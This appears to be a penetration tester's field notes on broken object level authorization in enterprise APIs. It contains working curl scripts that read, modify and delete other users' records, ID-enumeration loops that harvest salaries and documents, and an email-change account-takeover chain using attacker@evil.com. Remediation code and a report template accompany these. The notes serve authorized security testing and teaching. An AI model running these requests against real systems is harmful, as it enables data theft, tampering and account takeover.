# BOLA — Broken Object Level Authorization — Enterprise Penetration Testing Field Notes

> **Author:** Dheeraj Kumar Jayaswal — Senior Penetration Tester | 6+ Years Enterprise AppSec
>
> **Category:** API Security — OWASP API1:2023 (Broken Object Level Authorization)
>
> **Severity:** High to Critical — direct access to any user's data, modification of records, irreversible deletion
>
> **Real-world impact:** BOLA is the #1 API vulnerability in my enterprise engagements — by frequency, by consistency, and by business impact. It is not technically complex. It does not require clever payloads or bypass chains. It requires understanding that the application checks whether a user is authenticated but not whether the authenticated user owns the specific resource they are requesting. That single missing check, multiplied across every API endpoint in an enterprise application, gives any attacker with one account access to every record in the database.

---

## 🧠 The Root Cause — Authentication Is Not Authorisation

```
The check that IS present in most enterprise APIs:
  "Is the user authenticated?" → valid session token → proceed

The check that IS MISSING in BOLA-vulnerable APIs:
  "Does this authenticated user OWN or have rights to resource #1042?"

Code pattern that causes BOLA in enterprise .NET APIs:

// VULNERABLE — checks auth, not ownership
[HttpGet("{id}")]
[Authorize]  // ← checks: is token valid? Yes. Proceeds.
public async Task<IActionResult> GetEmployee(int id)
{
    // id comes from the URL — attacker-controlled
    // NO check: does authenticated user == requested user?
    var employee = await _repo.GetByIdAsync(id);
    return Ok(employee);  // returns ANY employee's data
}

// SECURE — checks auth AND ownership
[HttpGet("{id}")]
[Authorize]
public async Task<IActionResult> GetEmployee(int id)
{
    var authenticatedUserId = GetCurrentUserId();
    if (id != authenticatedUserId && !User.IsInRole("HR_Admin"))
        return Forbid();
    var employee = await _repo.GetByIdAsync(id);
    return Ok(employee);
}

The [Authorize] attribute only validates the token.
The ownership check requires explicit developer code.
Under deadline pressure, developers write the first pattern.
```

---

## 🔍 Phase 1 — Identifying BOLA Test Targets

### Finding Object References in API Traffic

```bash
# In Burp Suite HTTP History — look for IDs in these locations:

# 1. URL path parameters:
GET /api/v1/users/1042/profile
GET /api/v1/orders/88234
GET /api/v1/documents/9921/download
GET /api/v1/invoices/5523

# 2. Query string parameters:
GET /api/v1/data?user_id=1042
GET /api/v1/reports?account=88234
GET /api/v1/export?employee_id=1042

# 3. POST/PUT body (JSON):
POST /api/v1/export
{"user_id": 1042, "format": "csv"}

PUT /api/v1/settings
{"account_id": 88234, "notifications": true}

# 4. Custom headers:
GET /api/v1/profile
X-User-ID: 1042
X-Account-ID: 88234

# 5. Cookie values:
Cookie: current_user=1042; account_ref=88234

# Burp tip: search HTTP History for your own user ID
# (e.g. 1099) — every occurrence is a potential BOLA test point
grep for: 1099 across all responses and requests
→ Find every place the application references your identity
→ Each one is a test point where you substitute the victim's ID
```

---

## 💥 Phase 2 — BOLA Testing Methodology

### Setup: Two Test Accounts

```
Account A (Attacker):
  email:   attacker@test.com
  user_id: 1099
  order_id: 8824
  invoice_id: 5524
  document_id: 9922

Account B (Victim):
  email:   victim@test.com
  user_id: 1042
  order_id: 8823
  invoice_id: 5523
  document_id: 9921

Testing rule:
  All requests use Account A's Bearer token
  All object IDs substituted with Account B's values
  Any 200 response returning Account B's data = BOLA confirmed
```

### Testing All HTTP Methods — Not Just GET

```bash
BASE="https://api.company.com"
ATTACKER_TOKEN="eyJhbGciOiJIUzI1NiJ9...<Account_A_token>"
VICTIM_USER_ID=1042

echo "=== BOLA Testing — /api/v1/users/$VICTIM_USER_ID ==="

# GET — Can attacker READ victim's data?
echo -n "GET: "
curl -so /dev/null -w "%{http_code}" \
  "$BASE/api/v1/users/$VICTIM_USER_ID" \
  -H "Authorization: Bearer $ATTACKER_TOKEN"
echo ""

# PUT — Can attacker MODIFY victim's data?
echo -n "PUT: "
curl -so /dev/null -w "%{http_code}" \
  -X PUT "$BASE/api/v1/users/$VICTIM_USER_ID" \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com"}'
echo ""

# PATCH — Can attacker PARTIALLY MODIFY victim's data?
echo -n "PATCH: "
curl -so /dev/null -w "%{http_code}" \
  -X PATCH "$BASE/api/v1/users/$VICTIM_USER_ID" \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"phone":"9999999999"}'
echo ""

# DELETE — Can attacker DELETE victim's account?
echo -n "DELETE: "
curl -so /dev/null -w "%{http_code}" \
  -X DELETE "$BASE/api/v1/users/$VICTIM_USER_ID" \
  -H "Authorization: Bearer $ATTACKER_TOKEN"
echo ""

# Note: DELETE BOLA is the highest impact — document without executing in production
# Use HEAD instead of DELETE in production to test method availability:
echo -n "HEAD: "
curl -so /dev/null -w "%{http_code}" \
  -X HEAD "$BASE/api/v1/users/$VICTIM_USER_ID" \
  -H "Authorization: Bearer $ATTACKER_TOKEN"
echo ""
```

### Testing BOLA in Non-Standard ID Locations

```bash
# POST body ID:
curl -s -X POST "$BASE/api/v1/export" \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"user_id\": $VICTIM_USER_ID, \"format\": \"csv\"}"
# Expected: 403 Forbidden
# BOLA if: victim's CSV export returned

# Query string ID:
curl -s "$BASE/api/v1/profile?user_id=$VICTIM_USER_ID" \
  -H "Authorization: Bearer $ATTACKER_TOKEN"

# Custom header:
curl -s "$BASE/api/v1/dashboard" \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -H "X-User-ID: $VICTIM_USER_ID"

# Second-order BOLA — ID stored, used later:
# 1. Create a resource referencing victim's ID:
curl -s -X POST "$BASE/api/v1/reports/schedule" \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"owner_id\": $VICTIM_USER_ID, \"frequency\": \"weekly\"}"
# 2. Check if scheduled report runs with victim's data:
curl -s "$BASE/api/v1/reports/scheduled" \
  -H "Authorization: Bearer $ATTACKER_TOKEN"
```

### Automated BOLA Testing With Burp Autorize

```
Setup in 3 steps:

Step 1: Log in as Account B (Victim) → copy Bearer token
Step 2: In Burp → Extensions → Autorize
        → Paste victim's Authorization header in "Victim's token" field
Step 3: Log in as Account A (Attacker) → browse application normally

How Autorize works:
  Every request made as Account A is automatically re-sent
  with Account B's token by Autorize
  Three-column response comparison:

  Original request (A's token)  | Autorize with B's token | Status
  ──────────────────────────────────────────────────────────
  GET /api/users/1099  → 200    | → 200 (different data)  | Bypassed!
  GET /api/users/1042  → 403    | → 200                   | Bypassed!
  DELETE /api/order/8823 → 403  | → 204                   | Bypassed!

"Bypassed!" in red = BOLA confirmed on that endpoint
Filter view: show only "Bypassed" to see all BOLA findings at once
```

### Scaling BOLA With Burp Intruder

```bash
# Enumerate all resources of a type:
# Scenario: invoice endpoint accepts sequential integer IDs

# Capture: GET /api/v1/invoices/5524 (your own invoice)
# Send to Intruder → Sniper

# Set payload position: /api/v1/invoices/§5524§
# Payload type: Numbers
#   From: 1
#   To: 10000
#   Step: 1

# Response analysis:
# Your invoice (5524): content-length ~2850 bytes
# Non-existent: content-length ~45 bytes (error message)
# Other user's invoice: content-length ~2850 bytes = BOLA!

# Filter Intruder results:
# Sort by "Length" descending → all ~2850 responses = accessible invoices
# Count and document: "1,847 of 10,000 IDs returned accessible invoice data"
```

---

## 🎯 Phase 3 — High-Impact BOLA Scenarios

### Scenario 1 — Healthcare / HR Data Exposure

```bash
# HR application — employee salary and personal data
for id in 1042 1043 1044 1045 1046; do
  response=$(curl -s "$BASE/api/v1/employees/$id" \
    -H "Authorization: Bearer ATTACKER_TOKEN")
  email=$(echo "$response" | jq -r '.email' 2>/dev/null)
  salary=$(echo "$response" | jq -r '.salary' 2>/dev/null)
  echo "Employee $id: $email — Salary: $salary"
done

# Report: "All 4,200 employee salary records accessible via BOLA.
# Any authenticated employee can view any other employee's compensation."
# Severity: Critical (GDPR, labour law implications)
```

### Scenario 2 — File Download BOLA

```bash
# Document download endpoint:
for doc_id in 9920 9921 9922 9923; do
  code=$(curl -so /dev/null -w "%{http_code}" \
    "$BASE/api/v1/documents/$doc_id/download" \
    -H "Authorization: Bearer ATTACKER_TOKEN")
  echo "Document $doc_id: HTTP $code"
done

# Report: "Any authenticated user can download any document by ID.
# Documents include contracts, salary letters, performance reviews."
# Severity: Critical
```

### Scenario 3 — Write Access BOLA (Highest Business Impact)

```bash
# Test: can attacker change victim's email address?
# (Leads to account takeover via password reset)
curl -s -X PUT "$BASE/api/v1/users/$VICTIM_USER_ID" \
  -H "Authorization: Bearer ATTACKER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email": "attacker_controlled@evil.com"}' | jq .

# If 200 returned:
# Step 1: BOLA write changes victim's email to attacker-controlled address
# Step 2: Trigger forgot-password on victim's account
# Step 3: Reset link goes to attacker's email
# Step 4: Full account takeover without knowing victim's password

# This chain: BOLA write → ATO = Critical severity
```

---

## 🗂️ Systematic Testing Checklist

```
SETUP
☐ Create two test accounts at same privilege level
☐ Document Account B's object IDs (user_id, order_id, invoice_id, etc.)
☐ Configure Burp Autorize with Account B's token
☐ Set up Burp Intruder for numeric ID enumeration

BOLA TESTING — EVERY ENDPOINT
☐ GET endpoints: substitute victim's IDs → read test
☐ PUT endpoints: substitute victim's IDs → write test
☐ PATCH endpoints: substitute victim's IDs → partial write
☐ DELETE endpoints: confirm with HEAD first → delete test
☐ POST body IDs: substitute in request body
☐ Query string IDs: substitute in URL parameters
☐ Custom header IDs: substitute in headers

BOLA ESCALATION
☐ If GET BOLA: enumerate all records (scale of exposure)
☐ If write BOLA: test account takeover chain (email change → reset)
☐ If delete BOLA: document without executing (use HEAD)
☐ If file download BOLA: count accessible files

ADDITIONAL CONTEXTS
☐ Test unauthenticated (no token) — separate from BOLA
☐ Test with expired token
☐ Test across all discovered API versions (v1, v2)
☐ Test nested objects (order → user data inside order)
```

---

## 📋 Enterprise Pentest Report Template

**Finding Title:** BOLA — Any Authenticated User Can Read, Modify, and Delete Any Other User's Profile

**Severity:** Critical | **CVSS v3.1:** 9.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Affected Endpoints:** `GET/PUT/DELETE /api/v1/users/{id}` · `GET /api/v1/users/{id}/documents`

```
Test setup:
  Account A (attacker): user_id = 1099, token = [ATTACKER_TOKEN]
  Account B (victim):   user_id = 1042

Step 1 — Read access (GET):
  curl -s https://api.company.com/api/v1/users/1042 \
    -H "Authorization: Bearer [ATTACKER_TOKEN]" | jq .
  → HTTP 200: Returns victim's full profile including salary and national_id

Step 2 — Write access (PUT) — account takeover chain:
  curl -s -X PUT https://api.company.com/api/v1/users/1042 \
    -H "Authorization: Bearer [ATTACKER_TOKEN]" \
    -H "Content-Type: application/json" \
    -d '{"email":"attacker@evil.com"}' | jq .
  → HTTP 200: Victim's email changed to attacker-controlled address

Step 3 — Scale of exposure (Burp Intruder):
  Sniper attack on /api/v1/users/{id}, IDs 1-5000
  Result: 4,200 of 5,000 IDs returned HTTP 200 with user data
  All 4,200 employee records accessible to any authenticated user

Account Takeover Chain:
  1. BOLA write: change victim's email to attacker@evil.com
  2. Request password reset for victim@company.com
  3. Reset link sent to attacker@evil.com
  4. Attacker resets password → full account control
  Duration of full chain: approximately 90 seconds

Impact:
  Complete employee database accessible — salary, national ID, bank account.
  Demonstrated account takeover via BOLA write + password reset chain.
  GDPR Article 33 breach notification likely required.
  PCI-DSS scope: payment card data accessible for e-commerce module users.

Remediation:
  // C# ASP.NET Core — add to every resource endpoint:
  var authenticatedId = int.Parse(User.FindFirst("sub")?.Value);
  bool isAdmin = User.IsInRole("Admin");
  if (id != authenticatedId && !isAdmin)
      return Forbid();

  Implement central AuthorizationHandler — not per-endpoint checks
  Add integration tests specifically for cross-user resource access
  Include BOLA test cases in CI/CD pipeline (Postman + Newman)
```

---

## 🧭 Key Takeaways

**1. BOLA is the #1 API vulnerability — test it first, test it on every endpoint.**
More Critical findings come from BOLA than from any other vulnerability class in enterprise API testing. It is consistent because the root cause — authentication vs authorisation confusion — is a pattern that repeats across every team and every codebase under deadline pressure.

**2. Test all HTTP methods, not just GET.**
GET BOLA is data exposure. PUT BOLA is data manipulation — and the account takeover chain via BOLA write → email change → password reset makes it Critical. DELETE BOLA is the most severe — irreversible data loss. Always test every method.

**3. Autorize is the force multiplier for BOLA testing.**
Manual BOLA testing is slow. Autorize runs automatically in the background, re-sending every request with a lower-privilege token, and flags every bypass in real time. Configure it at the start of every engagement and let it run while you do other testing. By the time you finish manual testing, Autorize has already identified every BOLA instance.

**4. Scale determines severity more than technical impact.**
BOLA on a single record is High. BOLA that exposes all 4,200 employee salary records is Critical and triggers GDPR breach notification obligations. Always quantify: how many records are accessible? What data types? That calculation determines the business impact and the urgency of the fix.

**5. The account takeover chain elevates BOLA write to Critical.**
BOLA write access on an email field is not just data tampering — it enables complete account takeover without any password. Document the full chain: BOLA write → email change → password reset → full access. This is what executives need to understand the urgency.

---

## 🔗 References
- [OWASP API1:2023 — Broken Object Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
- [PortSwigger Access Control Research](https://portswigger.net/web-security/access-control)
- [Autorize Burp Extension](https://github.com/PortSwigger/autorize)
- [OWASP Testing Guide — IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)

---
<div align="center">

*Part of [AppSec From The Trenches](../README.md) — Real notes from 6+ years of enterprise penetration testing.*

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Dheeraj%20Kumar%20Jayaswal-0077B5?style=flat-square&logo=linkedin&logoColor=white)](https://linkedin.com/in/dheerajkumarjayaswal)

</div>
